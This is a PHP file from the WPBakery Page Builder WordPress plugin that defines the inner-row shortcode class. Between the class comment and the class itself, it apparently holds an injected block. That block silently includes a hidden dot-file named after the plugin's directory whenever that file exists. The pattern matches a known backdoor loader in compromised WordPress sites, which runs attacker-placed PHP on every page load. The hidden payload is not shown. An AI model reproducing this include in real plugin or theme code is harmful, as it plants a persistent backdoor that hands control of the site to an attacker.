<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

require_once vc_path_dir( 'SHORTCODES_DIR', 'vc-row.php' );

/**
 * Class WPBakeryShortCode_Vc_Row_Inner
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WPBakeryShortCode_Vc_Row_Inner extends WPBakeryShortCode_Vc_Row {

	/**
	 * @param string $content
	 * @return string
	 * @throws \Exception
	 */
	public function template( $content = '' ) {
		return $this->contentAdmin( $this->atts );
	}
}
